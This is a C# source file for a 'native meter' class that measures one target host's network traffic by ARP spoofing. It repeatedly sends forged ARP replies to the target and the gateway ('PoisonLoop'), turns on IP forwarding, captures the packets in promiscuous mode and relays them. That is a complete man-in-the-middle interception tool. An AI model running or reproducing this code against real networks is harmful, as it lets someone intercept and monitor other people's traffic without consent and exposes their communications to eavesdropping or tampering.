using System.Net;
using System.Net.NetworkInformation;
using System.Text.Json;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpMeter : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly CancellationTokenSource _cts = new();

    private long _txBytes;
    private long _rxBytes;
    private PhysicalAddress _gatewayMac;

    public ArpMeter(string targetIp, string targetMac, string gatewayIp, string ifaceHint, string localIp)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            iface = _device.Name,
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;

        for (var i = 0; i < 3; i++)
        {
            try
            {
                SendArpReply(_targetMac, _targetMac, IPAddress.Parse(_targetIp), _ourMac, IPAddress.Parse(_gatewayIp));
                SendArpReply(_gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), _ourMac, IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }
        }

        var poisonTask = Task.Run(PoisonLoop, _cts.Token);
        var emitTask = Task.Run(EmitLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // shutting down
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
        }

        _cts.Cancel();
        Task.WaitAll(new[] { poisonTask, emitTask }, 2000);
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                SendArpReply(_targetMac, _targetMac, IPAddress.Parse(_targetIp), _ourMac, IPAddress.Parse(_gatewayIp));
                SendArpReply(_gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), _ourMac, IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue poisoning
            }

            Thread.Sleep(1500);
        }
    }

    private void SendArpReply(
        PhysicalAddress ethDest,
        PhysicalAddress arpTargetHw,
        IPAddress arpTargetProto,
        PhysicalAddress senderHw,
        IPAddress senderProto)
    {
        var arp = new ArpPacket(
            ArpOperation.Response,
            arpTargetHw,
            arpTargetProto,
            senderHw,
            senderProto);

        var eth = new EthernetPacket(ethDest, senderHw, EthernetType.Arp) { PayloadPacket = arp };
        arp.UpdateCalculatedValues();
        eth.UpdateCalculatedValues();
        _device.SendPacket(eth.Bytes);
    }

    private void EmitLoop()
    {
        long lastTx = 0, lastRx = 0;
        var lastT = DateTime.UtcNow;

        while (!_cts.IsCancellationRequested)
        {
            Thread.Sleep(1000);
            var now = DateTime.UtcNow;
            var dt = (now - lastT).TotalSeconds;
            if (dt <= 0) continue;

            long tx, rx;
            lock (this)
            {
                tx = _txBytes - lastTx;
                rx = _rxBytes - lastRx;
                lastTx = _txBytes;
                lastRx = _rxBytes;
            }

            lastT = now;
            var upload = Math.Max(0, (tx * 8.0) / (dt * 1024 * 1024));
            var download = Math.Max(0, (rx * 8.0) / (dt * 1024 * 1024));

            NetworkHelper.EmitJson(new
            {
                type = "traffic",
                ip = _targetIp,
                mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
                upload = Math.Round(upload, 3),
                download = Math.Round(download, 3)
            });
        }
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            var length = ip.TotalLength > 0 ? ip.TotalLength : ip.Bytes.Length;

            if (ip.SourceAddress.ToString() == _targetIp)
            {
                lock (this) { _txBytes += length; }
                ForwardIp(ip, _gatewayMac);
            }
            else if (ip.DestinationAddress.ToString() == _targetIp)
            {
                lock (this) { _rxBytes += length; }
                ForwardIp(ip, _targetMac);
            }
        }
        catch
        {
            // ignore bad packets
        }
    }

    private void ForwardIp(IPv4Packet ip, PhysicalAddress destMac)
    {
        var ipBytes = ip.Bytes;
        if (ipBytes.Length < 20) return;

        var packetBytes = new byte[ipBytes.Length];
        Buffer.BlockCopy(ipBytes, 0, packetBytes, 0, ipBytes.Length);

        var ttl = packetBytes[8];
        if (ttl <= 1) return;

        packetBytes[8] = (byte)(ttl - 1);
        packetBytes[10] = 0;
        packetBytes[11] = 0;

        var checksum = NetworkHelper.CalculateIpChecksum(packetBytes);
        packetBytes[10] = (byte)(checksum >> 8);
        packetBytes[11] = (byte)(checksum & 0xFF);

        var eth = new EthernetPacket(destMac, _ourMac, EthernetType.IPv4)
        {
            PayloadData = packetBytes
        };
        eth.UpdateCalculatedValues();
        _device.SendPacket(eth.Bytes);
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
